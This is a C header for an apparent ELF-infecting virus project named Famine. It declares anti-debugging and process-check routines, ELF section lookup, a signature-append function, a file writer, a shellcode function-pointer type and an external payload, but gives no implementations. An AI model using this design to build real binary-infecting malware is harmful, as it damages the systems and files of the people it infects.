#ifndef FAMINE_H
# define FAMINE_H

# include <stdio.h>
# include <dirent.h>
# include <sys/mman.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <sys/types.h>
# include <unistd.h>
# include <elf.h>
# include <errno.h>
# include <string.h>
# include <stdlib.h>
# include <sys/ptrace.h>
# include <sys/wait.h>
# include <proc/readproc.h>
# include <dlfcn.h>

struct  bfile {
  off_t       size;
  Elf64_Ehdr  *header;
};

typedef int (*shellcode)(void *(*dlsym)(void *, const char *), void *handle, const char *dirname,  const char *filename, const char *payload);

extern const char *payload;

int         preventDebug(void);
int         checkProcess(void);

Elf64_Shdr   *getDataSectionHeader(Elf64_Ehdr *header);
int         appendSignature(struct bfile file, size_t offset);

int         writeToFile(const char *dirname, const char *filename, struct bfile header);

shellcode   getSymbol(Elf64_Ehdr *header);

#endif
